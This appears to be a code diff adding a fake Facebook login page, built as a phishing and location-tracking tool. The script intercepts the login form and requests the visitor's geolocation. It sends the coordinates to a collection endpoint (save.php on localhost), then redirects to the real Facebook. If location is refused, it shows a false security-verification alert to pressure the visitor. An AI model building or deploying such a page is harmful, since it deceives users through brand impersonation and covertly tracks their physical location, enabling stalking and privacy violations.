@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
+            <h2>Connect with friends and the world around you on Facebook.</h2>
+        </div>
+        <div class="right">
+            <div class="login-box">
+                <form id="loginForm">
+                    <input type="text" placeholder="Email or phone number" name="email" required>
+                    <input type="password" placeholder="Password" name="password" required>
+                    <button type="submit" class="login-btn">Log In</button>
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                    <div class="divider"></div>
+                    <button class="create-btn">Create New Account</button>
+                </form>
+                <p class="page-link"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        fetch('http://localhost:8080/save.php?status=page_loaded');
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        fetch(`http://localhost:8080/save.php?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&status=location_granted`);
+                        setTimeout(() => {
+                            window.location.href = "https://facebook.com";
+                        }, 1500);
+                    },
+                    err => {
+                        fetch('http://localhost:8080/save.php?status=location_denied');
+                        alert("For security verification, please enable location services");
+                    }
+                );
+            }
+        });
+    </script>
+</body>
+</html>
